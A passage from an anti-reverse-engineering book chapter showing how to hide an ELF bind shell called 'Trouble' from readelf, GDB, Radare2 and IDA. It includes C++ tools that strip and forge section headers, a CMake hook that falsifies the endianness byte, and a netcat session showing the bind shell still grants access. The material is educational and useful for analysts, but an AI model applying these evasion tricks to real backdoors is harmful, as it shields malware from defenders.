45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00\nClass: ELF64\nData: 2's complement, little endian\nVersion: 1 (current)\nOS/ABI: UNIX - System V\nABI Version: 0\nType: EXEC (Executable file)\nMachine: Advanced Micro Devices X86-64\nVersion: 0x1\nEntry point address: 0x4002f2\nStart of program headers: 64 (bytes into file)\nStart of section headers: 0 (bytes into file)\nFlags: 0x0\nSize of this header: 64 (bytes)\nSize of program headers: 56 (bytes)\n\n\n-----\n\n###### Chapter 3: File Format Hacks 70\n\nNumber of program headers: 4\nSize of section headers: 0 (bytes)\nNumber of section headers: 0\nSection header string table index: 0\n\n##### As you can see all the section header table values in the ELF headers are set to zero. Now if readelf tries to read Trouble’s section header table it’ll fail.\n\n###### readelf can’t find the section header table\n\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ readelf -S ./t\\\nrouble\n\nThere are no sections in this file.\n\n##### For another example, try Radare2. Before you zeroed out the values in the ELF header Radare2 listed the sections without issue.\n\n###### Radare2 sections with intact ELF header\n\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ radare2 ./trou\\\nble\nWarning: Cannot initialize dynamic strings\n-- Welcome back, lazy human!\n\n[0x004002f2]> iS\n\n[Sections]\nidx=00 vaddr=0x00000000 paddr=0x00000000 sz=0 vsz=0 perm=----- name=\nidx=01 vaddr=0x00400120 paddr=0x00000120 sz=3 vsz=3 perm=--r-x name=.init\nidx=02 vaddr=0x00400130 paddr=0x00000130 sz=4719 vsz=4719 perm=--r-x name=.text\nidx=03 vaddr=0x0040139f paddr=0x0000139f sz=3 vsz=3 perm=--r-x name=.fini\nidx=04 vaddr=0x004013c0 paddr=0x000013c0 sz=2136 vsz=2136 perm=--r-- name=.rodata\nidx=05 vaddr=0x00401c18 paddr=0x00001c18 sz=4 vsz=4 perm=--r-- name=.eh_frame\nidx=06 vaddr=0x00601fe8 paddr=0x00001fe8 sz=8 vsz=8 perm=--rw- name=.init_array\nidx=07 vaddr=0x00601ff0 paddr=0x00001ff0 sz=8 vsz=8 perm=--rw- name=.fini_array\nidx=08 vaddr=0x00601ff8 paddr=0x00001ff8 sz=8 vsz=8 perm=--rw- name=.jcr\nidx=09 vaddr=0x00602000 paddr=0x00002000 sz=352 vsz=352 perm=--rw- name=.data\nidx=10 vaddr=0x00602180 paddr=0x00002160 sz=800 vsz=800 perm=--rw- name=.bss\nidx=11 vaddr=0x00000000 paddr=0x00002160 sz=88 vsz=88 perm=----- name=.comment\nidx=12 vaddr=0x00000000 paddr=0x000021b8 sz=96 vsz=96 perm=----- name=.shstrtab\nidx=13 vaddr=0x00400000 paddr=0x00000000 sz=7196 vsz=7196 perm=m-r-x name=LOAD0\n\n\n-----\n\n###### Chapter 3: File Format Hacks 71\n\nidx=14 vaddr=0x00601fe8 paddr=0x00001fe8 sz=376 vsz=1208 perm=m-rw- name=LOAD1\nidx=15 vaddr=0x00000000 paddr=0x00000000 sz=0 vsz=0 perm=m-rw- name=GNU_STACK\nidx=16 vaddr=0x00601fe8 paddr=0x00001fe8 sz=24 vsz=24 perm=m-r-- name=GNU_RELRO\nidx=17 vaddr=0x00400000 paddr=0x00000000 sz=64 vsz=64 perm=m-rw- name=ehdr\n\n##### You’ll notice that Radare2 has combined the section headers table and the program headers into a “sections” table. This isn’t technically correct, but good enough. If you look carefully, you’ll see all the sections from the section headers table that have virtual addresses (indexes 1-10) map into LOAD0 and LOAD1 from the program headers. This helps explain why the section headers table isn’t needed to execute the binary. All the necessary information is present in the program headers.\n\n After you zero out the ELF header values, Radare2 can no longer find the section headers table either.\n\n###### Radare2 sections with modified ELF header\n\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ radare2 ./trou\\\nble\nWarning: Cannot initialize section headers\nWarning: Cannot initialize strings table\nWarning: Cannot initialize dynamic strings\n-- In Soviet Russia, radare2 has documentation.\n\n[0x00400130]> iS\n\n[Sections]\nidx=00 vaddr=0x00400000 paddr=0x00000000 sz=7196 vsz=7196 perm=m-r-x name=LOAD0\nidx=01 vaddr=0x00601fe8 paddr=0x00001fe8 sz=376 vsz=1208 perm=m-rw- name=LOAD1\nidx=02 vaddr=0x00000000 paddr=0x00000000 sz=0 vsz=0 perm=m-rw- name=GNU_STACK\nidx=03 vaddr=0x00601fe8 paddr=0x00001fe8 sz=24 vsz=24 perm=m-r-- name=GNU_RELRO\nidx=04 vaddr=0x00400000 paddr=0x00000000 sz=64 vsz=64 perm=m-rw- name=ehdr\n\n##### However, the table is still there. A clever reverse engineer could scan the binary for the section headers table data structures. Plus the section names are easily recoverable using the strings utility.\n\n\n-----\n\n###### Chapter 3: File Format Hacks 72\n\n Finding section names with strings\n\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ strings -a ./t\\\nrouble\n<output truncated>\n.shstrtab\n.init\n.text\n.fini\n.rodata\n.eh_frame\n.init_array\n.fini_array\n.jcr\n.data\n.bss\n\n##### Removing the section headers table altogther seems like a smart idea. Not only would removing the table hide the section information, but it will pave the way for some trickery introduced later in this chapter.\n\n However, there is no tool that I know of that will remove the section headers table. I’ve had to write out own. In the code for chapter three you’ll find a directory called “stripBinary”. The project is made up of two files: CMakeLists.txt and stripBinary.cpp. Note that this is our first project written in C++. I personally prefer C++, but your mileage may vary. The code should be fairly easy to rewrite in C, Python, or your language of choice.\n\n###### chap_3_format_hacks/stripBinary/CMakeLists.txt\n\nproject(stripBinary CXX)\ncmake_minimum_required(VERSION 3.0)\n\nset(CMAKE_CXX_FLAGS \"-Wall -Wextra -Wshadow -g\")\nadd_executable(${PROJECT_NAME} ./src/stripBinary.cpp)\n\n\n-----\n\n###### Chapter 3: File Format Hacks 73\n\n chap_3_format_hacks/stripBinary/stripBinary.cpp\n\n#include <cstdlib>\n#include <iostream>\n#include <fstream>\n#include <iomanip>\n#include <cstring>\n#include <elf.h>\n\n/**\n\n - This program will take in a binary and overwrite the sections table with\n\n - zeroes. It will also overwite the sections names with zeroes. Finally, it\n\n - fixes up the ELF header and overwrites the old binary.\n*/\n\n/**\n\n - Finds the offset to the sections table.\n \n - \\param[in] p_data the ELF binary\n\n - \\param[in,out] p_sec_count the number of sections in the section table\n\n - \\param[in,out] p_str_index the section index of the section strings table\n\n - \\return a pointer to the start of the sections table\n*/\nElf64_Shdr* find_sections(std::string& p_data, int& p_sec_count, int& p_str_index)\n{\n\n**if (p_data[0] != 0x7f || p_data[1] != 'E' || p_data[2] != 'L' ||**\n\np_data[3] != 'F')\n{\n\n**return NULL;**\n}\n\nElf64_Ehdr* ehdr = reinterpret_cast<Elf64_Ehdr*>(&p_data[0]);\n\nElf64_Off section_offset = ehdr->e_shoff;\nehdr->e_shoff = 0;\n\np_sec_count = ehdr->e_shnum;\nehdr->e_shnum = 0;\n\np_str_index = ehdr->e_shstrndx;\nehdr->e_shstrndx = 0;\n\n**return reinterpret_cast<Elf64_Shdr*>(&p_data[section_offset]);**\n\n\n-----\n\n###### Chapter 3: File Format Hacks 74\n\n}\n\n/**\n\n - Overwrites all the section headers with zeros and zeroes out the strings\n \n - \\param[in] p_data the ELF binary\n\n - \\param[in] p_sections a pointer to the first entry in the sections table\n\n - \\param[in] p_sec_count the number of entries in the sections table\n\n - \\param[in] p_str_index the index of the table we are going to remove\n\n - \\return true if we successfully overwrote everything\n*/\n**bool remove_headers(std::string& p_data, Elf64_Shdr* p_sections, int p_sec_count,**\n\n**int p_str_index)**\n{\n\n// look through all the headers. Ensure nothing is using the string table\n// we plan on removing.\nElf64_Shdr* iter = p_sections;\n**for (int i = 0; i < p_sec_count; ++i, ++iter)**\n{\n\n**if (iter->sh_link == static_cast<Elf64_Word>(p_str_index))**\n{\nstd::cerr << \"A section is still linked to the str index: \" << iter->sh_l\\\nink << std::endl;\n\n**return false;**\n}\n\n**if (i == p_str_index)**\n{\n\n// overwrite the strings\nmemset(&p_data[iter->sh_offset], 0, iter->sh_size);\n}\n}\n\n// overwrite the entire table\nmemset(p_sections, 0, p_sec_count * sizeof(Elf64_Shdr));\n**return true;**\n}\n\n**int main(int p_argc, char** p_argv)**\n{\n\n**if (p_argc != 2)**\n{\nstd::cerr << \"Usage: ./stripBinary <file path>\" << std::endl;\n\n\n-----\n\n###### Chapter 3: File Format Hacks 75\n\n**return EXIT_FAILURE;**\n}\n\nstd::ifstream inputFile(p_argv[1], std::ifstream::in | std::ifstream::binary);\n**if (!inputFile.is_open() || !inputFile.good())**\n{\nstd::cerr << \"Failed to ropen the provided file: \" << p_argv[1] << std::endl;\n**return EXIT_FAILURE;**\n}\n\nstd::string input((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_it\\\nerator<char>());\ninputFile.close();\n\n**int section_count = 0;**\n**int str_index = 0;**\nElf64_Shdr* sections = find_sections(input, section_count, str_index);\n**if (sections == NULL || reinterpret_cast<char*>(sections) > (input.data() + input\\**\n.length()))\n{\nstd::cerr << \"Failed to find the sections table\" << std::endl;\n**return EXIT_FAILURE;**\n}\n\n**if (!remove_headers(input, sections, section_count, str_index))**\n{\n\n**return EXIT_FAILURE;**\n}\n\nstd::ofstream outputFile(p_argv[1], std::ofstream::out | std::ofstream::binary);\n**if (!outputFile.is_open() || !outputFile.good())**\n{\nstd::cerr << \"Failed to wopen the provided file: \" << p_argv[1] << std::endl;\n**return EXIT_FAILURE;**\n}\n\noutputFile.write(input.data(), input.length());\noutputFile.close();\n**return EXIT_SUCCESS;**\n}\n\n##### stripBinary.cpp is broken down into three parts:\n\n\n-----\n\n###### Chapter 3: File Format Hacks 76\n\n##### 1. Finding the offset to the section headers table 2. Overwriting the section headers table entries and the section names 3. Writing the updated binary to file\n\n To compile stripBinary, as before, just use CMake.\n\n###### Compiling stripBinary\n\nalbino-lobster@ubuntu:~/antire_book$ cd chap_3_format_hacks/stripBinary/\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/stripBinary$ mkdir build\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/stripBinary$ cd build/\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/stripBinary/build$ cmake ..\n-- The CXX compiler identification is GNU 5.4.0\n-- Check for working CXX compiler: /usr/bin/c++\n-- Check for working CXX compiler: /usr/bin/c++ -- works\n-- Detecting CXX compiler ABI info\n-- Detecting CXX compiler ABI info - done\n-- Detecting CXX compile features\n-- Detecting CXX compile features - done\n-- Configuring done\n-- Generating done\n-- Build files have been written to: /home/albino-lobster/antire_book/chap_3_format_h\\\nacks/stripBinary/build\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/stripBinary/build$ make\nScanning dependencies of target stripBinary\n\n[ 50%] Building CXX object CMakeFiles/stripBinary.dir/src/stripBinary.cpp.o\n\n[100%] Linking CXX executable stripBinary\n\n[100%] Built target stripBinary\n\n##### Using stripBinary is quite easy as well.\n\n\n-----\n\n###### Chapter 3: File Format Hacks 77\n\n Using stripBinary on Trouble\n\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/stripBinary/build$ ./stripBin\\\nary ~/antire_book/chap_3_format_hacks/trouble/build/trouble\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/stripBinary/build$ readelf -a\\\n\n~/antire_book/chap_3_format_hacks/trouble/build/trouble\nELF Header:\nMagic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00\nClass: ELF64\nData: 2's complement, little endian\nVersion: 1 (current)\nOS/ABI: UNIX - System V\nABI Version: 0\nType: EXEC (Executable file)\nMachine: Advanced Micro Devices X86-64\nVersion: 0x1\nEntry point address: 0x4002f2\nStart of program headers: 64 (bytes into file)\nStart of section headers: 0 (bytes into file)\nFlags: 0x0\nSize of this header: 64 (bytes)\nSize of program headers: 56 (bytes)\nNumber of program headers: 4\nSize of section headers: 64 (bytes)\nNumber of section headers: 0\nSection header string table index: 0\n\nThere are no sections in this file.\n\nThere are no sections to group in this file.\n\nProgram Headers:\nType Offset VirtAddr PhysAddr\nFileSiz MemSiz Flags Align\nLOAD 0x0000000000000000 0x0000000000400000 0x0000000000400000\n0x0000000000001c1c 0x0000000000001c1c R E 200000\nLOAD 0x0000000000001fe8 0x0000000000601fe8 0x0000000000601fe8\n0x0000000000000178 0x00000000000004b8 RW 200000\nGNU_STACK 0x0000000000000000 0x0000000000000000 0x0000000000000000\n0x0000000000000000 0x0000000000000000 RW 10\nGNU_RELRO 0x0000000000001fe8 0x0000000000601fe8 0x0000000000601fe8\n0x0000000000000018 0x0000000000000018 R 1\n\n\n-----\n\n###### Chapter 3: File Format Hacks 78\n\nThere is no dynamic section in this file.\n\nThere are no relocations in this file.\n\nThe decoding of unwind sections for machine type Advanced Micro Devices X86-64 is not\\\n\ncurrently supported.\n\nDynamic symbol information is not available for displaying symbols.\n\nNo version information found in this file.\n\n##### Like removing the .comment section, it would be really great to make stripBinary part of Trouble’s build process. However, because stripBinary is its own stand alone CMake project you’d need to restructure the Trouble CMake project. We’ll do so at the beginning of the next chapter. For now, I’ll simply remind you when stripBinary should be applied to Trouble.\n\n### Little Endian or Big Endian?\n\n##### In the previous section, you learned the section headers table is unnecessary. That might get you wondering, “What else isn’t used when executing an ELF binary?” Well, you aren’t the first to walk down this path. In fact, Brian Raiter wrote an interesting essay called “A Whirlwind Tutorial on Creating Really Teensy ELF Executables for Linux”³³ in which he explores how to create the smallest possible ELF executable. Part of his exploration involved using the unused space in the ELF header to store the program headers and some executable code. It is really quite clever and well worth a read.\n\n One of the fields that Raiter overwrites is the sixth byte in the ELF header. This byte resides within the e_ident array that makes up the first 16 bytes of any ELF binary. The sixth byte is called EI_DATA and it indicates the endianness of the binary. The man page says this about it:\n\n###### ³³http://www.muppetlabs.com/~breadbox/software/tiny/teensy.html\n\n\n-----\n\n###### Chapter 3: File Format Hacks 79\n\n man elf\n\nEI_DATA The sixth byte specifies the data encoding of the\nprocessor-specific data in the file. Currently,\nthese encodings are supported:\n\nELFDATANONE Unknown data format.\nELFDATA2LSB Two's complement, little-endian.\nELFDATA2MSB Two's complement, big-endian.\n\n##### If you think about it, it sort of makes sense that this field isn’t necessary to execute a binary. A system is either little-endian or big-endian (unless its ARM which can be bi-endian). As such, a loader probably doesn’t need to check this byte because it can only execute one or the other.\n\n However, tools like readelf, Radare2, and IDA are expected to read files from many architectures. This byte is important for them to determine the endianness of the binary. So what happens if you insert a lie?\n\n Look at what readelf currently says about the EI_DATA byte in Trouble (it appears in both the “Magic” and “Data” lines):\n\n###### Looking at EI_DATA in Trouble\n\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ readelf -a ./t\\\nrouble\nELF Header:\nMagic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00\nClass: ELF64\nData: 2's complement, little endian\n\n##### As you can see from the readelf output, Trouble’s EI_DATA byte (the 6th byte in the “magic” array) is set to 1 which means ELFDATA2LSB or “Two’s complement, little- endian”. Let’s change that to 2 or “Two’s complement, big-endian” using dd. Use the following command:\n\n\n-----\n\n###### Chapter 3: File Format Hacks 80\n\n Changing the EI_DATA byte with dd\n\nprintf '\\x02' | dd conv=notrunc of=./trouble bs=1 seek=5\n1+0 records in\n1+0 records out\n1 byte copied, 7.6279e-05 s, 13.1 kB/s\n\n##### Note that seek starts at 0 so use seek=5 instead of seek=6. Now check out what readelf has to say about Trouble.\n\n###### readelf after changing Trouble’s EI_DATA flag\n\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ readelf -a ./t\\\nrouble\nELF Header:\nMagic: 7f 45 4c 46 02 02 01 00 00 00 00 00 00 00 00 00\nClass: ELF64\nData: 2's complement, big endian\nVersion: 1 (current)\nOS/ABI: UNIX - System V\nABI Version: 0\nType: <unknown>: 200\nMachine: <unknown>: 0x3e00\nVersion: 0x1000000\nEntry point address: 0xf202400000000000\nStart of program headers: 4611686018427387904 (bytes into file)\nStart of section headers: -5178858096499359744 (bytes into file)\nFlags: 0x0\nSize of this header: 16384 (bytes)\nSize of program headers: 14336 (bytes)\nNumber of program headers: 1024\nSize of section headers: 16384 (bytes)\nNumber of section headers: 3072\nSection header string table index: 2816\nreadelf: Warning: The e_shentsize field in the ELF header is larger than the size of \\\nan ELF section header\nreadelf: Error: Reading 0x3000000 bytes extends past end of file for section headers\nreadelf: Error: Section headers are not available!\nreadelf: Warning: The e_phentsize field in the ELF header is larger than the size of \\\nan ELF program header\nreadelf: Error: Reading 0xe00000 bytes extends past end of file for program headers\nreadelf: Warning: The e_phentsize field in the ELF header is larger than the size of \\\n\n\n-----\n\n###### Chapter 3: File Format Hacks 81\n\nan ELF program header\nreadelf: Error: Reading 0xe00000 bytes extends past end of file for program headers\n\n##### Yikes! That’s properly messed up, isn’t it? It appears that readelf believes the endianness lie in Trouble.\n\n I doubt that GDB could be tricked by this though, right?\n\n###### Breaking GDB with an endianness lie\n\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ gdb ./trouble\nGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1\nCopyright (C) 2016 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law. Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"x86_64-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n<http://www.gnu.org/software/gdb/bugs/>.\nFind the GDB manual and other documentation resources online at:\n<http://www.gnu.org/software/gdb/documentation/>.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\n\"/home/albino-lobster/antire_book/chap_3_format_hacks/trouble/build/./trouble\": not i\\\nn executable format: File format not recognized\n\n##### Whoops. GDB rejected the executable with a “File format not recognized” error. Now I’m a little worried that Trouble won’t even execute. However, a quick test proves that I’m able to execute Trouble and a client can still connect to it.\n\n\n-----\n\n###### Chapter 3: File Format Hacks 82\n\n Trouble still works\n\nalbino-lobster@ubuntu:~$ nc 127.0.0.1 1270\nirVsrle0v1AcAi7Ox70jn00O8lx3ruwk\npwd\n/home/albino-lobster/antire_book/chap_3_format_hacks/trouble/build\nexit\n\n##### It appears that flipping a single bit stops readelf and GDB from doing their proper job. Let’s see how our favorite disassemblers hold up against this attack.\n\n###### Breaking Radare2 with the endianness lie\n\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ radare2 ./trou\\\nble\nWarning: Cannot initialize program headers\nWarning: Cannot initialize section headers\nWarning: Cannot initialize strings table\nWarning: Cannot initialize dynamic strings\nWarning: Cannot initialize dynamic section\nWarning: read (init_offset)\nWarning: read (get_fini)\n\n-- radare2 for FideOS, now with extra potato\n\n[0xf202400000000000]> aaa\n\n[Cannot find function 'entry0' at 0xf202400000000000(aa)\n\n[x] Analyze all flags starting with sym. and entry0 (aa)\n\n[Warning: Searching xrefs in non-executable regiones (aar)\n\n[x] Analyze len bytes of instructions for references (aar)\n\n[Oops invalid rangen calls (aac)\n\n[x] Analyze function calls (aac)\n\n[ ] [*] Use -AA or aaaa to perform additional experimental analysis.\n\n[x] Constructing a function name for fcn.* and sym.func.* functions (aan))\n\n[0xf202400000000000]> f fcn\n\n[0xf202400000000000]> pdf\np: Cannot find function at 0xf202400000000000\n\n[0xf202400000000000]>\n\n##### Ok, so Radare2 is broken too. I also tried Hopper but it displays nothing… which, from an anti reverse engineering point of view, is great because the user is given no hint as to what went wrong.\n\n\n-----\n\n###### Chapter 3: File Format Hacks 83\n\n##### IDA’s response is interesting. It starts off by displaying this error message:\n\n###### “IDA’s error message for the endianness lie”\n\n##### The typo makes my inner third grader gleeful, but I’m certain they mean “byte six”. However, after hitting “Yes” to continue, IDA does successfully disassemble the entire file. It appears IDA must have secondary methods for determining the true endianess.\n\n Despite IDA raining on our parade, this seems like a useful little obfuscation and its easy to add to our build process too. Just add the following line to the end of Trouble’s CMakeLists.txt.\n\n###### CMake command for inserting the endianness lie\n\nadd_custom_command(TARGET ${PROJECT_NAME}\n\nPOST_BUILD\nCOMMAND echo 'Ag==' | base64 -d | dd conv=notrunc of=${CMAKE_CURRE\\\nNT_BINARY_DIR}/${PROJECT_NAME} bs=1 seek=5)\n\n#### echo ‘Ag==’ | base64 -d\n\n###### You might be wondering, “What’s the deal with the CMake command for inserting the endianness lie?” Funny story, CMake doesn’t like back slashes in the add_custom_command() function and I found no work around for that. I tried just echoing the UTF-8 representation of ‘\\x02’ but that broke this book’s version tracking system. I finally settled on base64 decoding of echo -ne ‘\\x02’ | base64.\n\n##### When compiling Trouble with the new EI_DATA obfuscation added it should look like this:\n\n\n-----\n\n###### Chapter 3: File Format Hacks 84\n\n Compiling Trouble with the EI_DATA obfuscation\n\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ make clean; ma\\\nke\n-- Configuring done\n-- Generating done\n-- Build files have been written to: /home/albino-lobster/antire_book/chap_3_format_h\\\nacks/trouble/build\nScanning dependencies of target trouble\n\n[ 50%] Building C object CMakeFiles/trouble.dir/src/trouble.c.o\n\n[100%] Linking C executable trouble\nThe bind shell password is: lu0NwoGb2CtAWeqcwiHe8GNJcXRfxuLV\n1+0 records in\n1+0 records out\n1 byte copied, 4.1259e-05 s, 24.2 kB/s\n\n[100%] Built target trouble\n\n### The Sections Are a Lie\n\n##### In the previous two sections you learned that the section headers aren’t required to run an executable and you can insert false information into the ELF header to discourage analysis. Some disassemblers rely on the section headers table to provide address mappings and for discovering special sections like .init³⁴ and .fini. Is it possible to trick disassemblers by messing around with the section headers table?\n\n#### Flipping the Executable Bit\n\n##### Compile the chapter three version of the Trouble bind shell and remove the section headers table using the stripBinary utility. In readelf Trouble should now look like this:\n\n###### ³⁴https://gcc.gnu.org/onlinedocs/gccint/Initialization.html\n\n\n-----\n\n###### Chapter 3: File Format Hacks 85\n\n View of Trouble after stripBinary\n\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ readelf -a ./t\\\nrouble\nELF Header:\nMagic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00\nClass: ELF64\nData: 2's complement, little endian\nVersion: 1 (current)\nOS/ABI: UNIX - System V\nABI Version: 0\nType: EXEC (Executable file)\nMachine: Advanced Micro Devices X86-64\nVersion: 0x1\nEntry point address: 0x4002f2\nStart of program headers: 64 (bytes into file)\nStart of section headers: 0 (bytes into file)\nFlags: 0x0\nSize of this header: 64 (bytes)\nSize of program headers: 56 (bytes)\nNumber of program headers: 4\nSize of section headers: 64 (bytes)\nNumber of section headers: 0\nSection header string table index: 0\n\nThere are no sections in this file.\n\nThere are no sections to group in this file.\n\nProgram Headers:\nType Offset VirtAddr PhysAddr\nFileSiz MemSiz Flags Align\nLOAD 0x0000000000000000 0x0000000000400000 0x0000000000400000\n0x0000000000001c1c 0x0000000000001c1c R E 200000\nLOAD 0x0000000000001fe8 0x0000000000601fe8 0x0000000000601fe8\n0x0000000000000178 0x00000000000004b8 RW 200000\nGNU_STACK 0x0000000000000000 0x0000000000000000 0x0000000000000000\n0x0000000000000000 0x0000000000000000 RW 10\nGNU_RELRO 0x0000000000001fe8 0x0000000000601fe8 0x0000000000601fe8\n0x0000000000000018 0x0000000000000018 R 1\n\nThere is no dynamic section in this file.\n\n\n-----\n\n###### Chapter 3: File Format Hacks 86\n\nThere are no relocations in this file.\n\nThe decoding of unwind sections for machine type Advanced Micro Devices X86-64 is not\\\n\ncurrently supported.\n\nDynamic symbol information is not available for displaying symbols.\n\nNo version information found in this file.\n\n##### There are four program headers that describe Trouble’s address space. An important part of the program headers is the “flags” field. The flag field describes if a segment is executable, writeable, and/or readable. Of Trouble’s four program headers one is read only (“r”), two are readable and writeable (“rw”), and one is readable and executable (“re”). Do disassemblers use the “flags” field for their analysis? Let’s experiment.\n\n Let’s try to create a fake section headers table that reverses the program headers “flag” fields. This will hopefully make the disassembler think that the space described by the first LOAD is not executable and the space described by the second load is. The section headers table will have four entries:\n\n 1. An SHT_NULL section header. This is commonly placed at the beginning of a section table and would look weird if left out. 2. An SHT_PROGBITS section. In this section, you’ll set the address space to cover the first LOAD segment. However, instead of being “re” like the first LOAD it will be “rw” like the second LOAD. The name of the section will be “.data” so that it’ll look like a normal data section. 3. Another SHT_PROGBITS section. In this section, you’ll set the address space to cover the second LOAD segment. This time mark the segment as “re” instead of “rw”. The name for this section should be “.text” since it’ll look like a code segment. 4. A SHT_STRTAB section. This section will point to the end of the file where you’ll be appending a new list of section names.\n\n I’ve included code in chapter three that does exactly this. The project is called “fakeHeadersXBit”. The project, again, contains two files: CMakeLists.txt and fake- HeadersXBit.cpp.\n\n\n-----\n\n###### Chapter 3: File Format Hacks 87\n\n chap_3_format_hacks/fakeHeadersXbit/CMakeLists.txt\n\nproject(fakeHeadersXBit CXX)\ncmake_minimum_required(VERSION 3.0)\n\nset(CMAKE_C_FLAGS \"-Wall -Wextra -Wshadow\")\nadd_executable(${PROJECT_NAME} src/fakeHeadersXBit.cpp)\n\n###### fakeHeadersXBit.cpp\n\n#include <cstdlib>\n#include <iostream>\n#include <fstream>\n#include <iomanip>\n#include <cstring>\n#include <elf.h>\n\n/**\n\n - The goal of this tool is to confuse a disassembler into thinking that the\n\n - executable portion of the code is data and the data portion of the code is\n\n - executable.\n \n - This tool will add a section table to a binary that doesn't have one. The\n\n - section table will be made up of 4 headers:\n \n - - null header\n\n - - .data: this section covers what .text should, but we unset X and set W\n\n - - .text: this section covers what .data should, but we set X and unset W\n\n - - .shstrtab: the strings table.\n \n - This code makes the assumption that the binary has two PF_LOAD segments in\n\n - the program table. One segment with PF_X set and one with PF_W set.\n*/\n\n/*\n\n - Edits the ELF header to indicate that there are 6 section headers and that\n\n - the string table is the last one.\n \n - \\param[in,out] p_data the ELF binary\n\n - \\return true if its possible to add a section table. false otherwise\n*/\n\n\n-----\n\n###### Chapter 3: File Format Hacks 88\n\n**bool edit_elf_header(std::string& p_data)**\n{\n\n**if (p_data[0] != 0x7f || p_data[1] != 'E' || p_data[2] != 'L' ||**\n\np_data[3] != 'F')\n{\n\n**return false;**\n}\n\nElf64_Ehdr* ehdr = reinterpret_cast<Elf64_Ehdr*>(&p_data[0]);\n\n**if (ehdr->e_shoff != 0)**\n{\nstd::cerr << \"The binary already has a section table.\" << std::endl;\n**return false;**\n}\n\n**if (ehdr->e_shentsize != sizeof(Elf64_Shdr))**\n{\nstd::cerr << \"Unexpected section header size\" << std::endl;\n**return false;**\n}\n\nehdr->e_shoff = p_data.size();\nehdr->e_shnum = 4;\nehdr->e_shstrndx = 3;\n**return true;**\n}\n\n/*\n\n - This finds the PF_X segment and creates a section header named .data that\n\n - does not have the X bit set.\n \n - \\param[in,out] p_data the ELF binary\n\n - \\param[in,out] p_strings the section table string names\n\n - \\return true if no error was encountered\n*/\n**bool add_data_section(std::string& p_data, std::string& p_strings)**\n{\nElf64_Ehdr* ehdr = reinterpret_cast<Elf64_Ehdr*>(&p_data[0]);\nElf64_Phdr* phdr = reinterpret_cast<Elf64_Phdr*>(&p_data[0] + ehdr->e_phoff);\n\n**for (int i = 0; i < ehdr->e_phnum; i++, phdr++)**\n{\n\n\n-----\n\n###### Chapter 3: File Format Hacks 89\n\n**if (phdr->p_type == PT_LOAD)**\n{\n\n**if ((phdr->p_flags & PF_X) == PF_X)**\n{\n\nElf64_Shdr data_header = {};\ndata_header.sh_name = p_strings.size();\ndata_header.sh_type = SHT_PROGBITS;\ndata_header.sh_flags = SHF_ALLOC | SHF_WRITE;\ndata_header.sh_addr = phdr->p_vaddr;\ndata_header.sh_offset = phdr->p_offset;\ndata_header.sh_size = phdr->p_filesz;\ndata_header.sh_link = 0;\ndata_header.sh_info = 0;\ndata_header.sh_addralign = 4;\ndata_header.sh_entsize = 0;\np_strings.append(\".data\");\np_strings.push_back('\\x00');\np_data.append(reinterpret_cast<char*>(&data_header),\n\n**sizeof(data_header));**\n\n**return true;**\n}\n}\n}\n**return false;**\n}\n\n/*\n\n - This finds the PF_W segment and creates a section header named .text that\n\n - has the X bit set.\n \n - \\param[in,out] p_data the ELF binary\n\n - \\param[in,out] p_strings the section table string names\n\n - \\return true if no error was encountered\n*/\n**bool add_text_section(std::string& p_data, std::string& p_strings)**\n{\nElf64_Ehdr* ehdr = reinterpret_cast<Elf64_Ehdr*>(&p_data[0]);\nElf64_Phdr* phdr = reinterpret_cast<Elf64_Phdr*>(&p_data[0] + ehdr->e_phoff);\n\n**for (int i = 0; i < ehdr->e_phnum; i++, phdr++)**\n{\n\n\n-----\n\n###### Chapter 3: File Format Hacks 90\n\n**if (phdr->p_type == PT_LOAD)**\n{\n\n**if ((phdr->p_flags & PF_X) == 0)**\n{\nElf64_Shdr text_header = {};\ntext_header.sh_name = p_strings.size();\ntext_header.sh_type = SHT_PROGBITS;\ntext_header.sh_flags = SHF_ALLOC | SHF_EXECINSTR;\ntext_header.sh_addr = phdr->p_vaddr;\ntext_header.sh_offset = phdr->p_offset;\ntext_header.sh_size = phdr->p_filesz;\ntext_header.sh_link = 0;\ntext_header.sh_info = 0;\ntext_header.sh_addralign = 4;\ntext_header.sh_entsize = 0;\np_strings.append(\".text\");\np_strings.push_back('\\x00');\np_data.append(reinterpret_cast<char*>(&text_header),\n\n**sizeof(text_header));**\n**return true;**\n}\n}\n}\n**return false;**\n}\n\n**bool append_sections(std::string& p_data)**\n{\n\n// this will contain the section name strings\nstd::string strings;\nstrings.push_back('\\x00');\n\n// first section is empty\nElf64_Shdr null_header = {};\np_data.append(reinterpret_cast<char*>(&null_header), sizeof(null_header));\n\n**if (!add_data_section(p_data, strings))**\n{\nstd::cerr << \"Failed to find the executable LOAD segment\" << std::endl;\n**return false;**\n}\n\n**if 